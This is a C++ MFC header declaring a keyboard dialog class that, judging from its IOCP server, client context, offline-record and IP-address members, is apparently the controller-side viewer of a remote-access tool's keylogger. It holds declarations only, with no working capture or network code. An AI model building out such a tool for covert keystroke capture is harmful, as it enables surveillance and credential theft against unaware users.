#if !defined(AFX_KEYBOARDDLG_H__5CC31868_8DFD_4FDE_B3A6_7ADA94B0E765__INCLUDED_)
#define AFX_KEYBOARDDLG_H__5CC31868_8DFD_4FDE_B3A6_7ADA94B0E765__INCLUDED_

#pragma once

#include <afxdialogex.h>

// KeyBoardDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CKeyBoardDlg dialog

class CKeyBoardDlg : public CDialogEx
{
// Construction
public:
	void OnReceiveComplete();
	CKeyBoardDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor

// Dialog Data
	//{{AFX_DATA(CKeyBoardDlg)
	enum { IDD = IDD_KEYBOARD };
	CEdit	m_edit;
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CKeyBoardDlg)
	public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	//}}AFX_VIRTUAL

// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(CKeyBoardDlg)
	virtual BOOL OnInitDialog();
//	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnClose();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnEnableOffline();
	afx_msg void OnSaveRecord();
	afx_msg void OnClearRecord();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()

private:
	bool SaveRecord();
	void UpdateTitle();
	void ResizeEdit();
	void AddKeyBoardData();
	HICON m_hIcon;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CString m_IPAddress;
	bool m_bIsOfflineRecord;
	void SendException();
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_KEYBOARDDLG_H__5CC31868_8DFD_4FDE_B3A6_7ADA94B0E765__INCLUDED_)
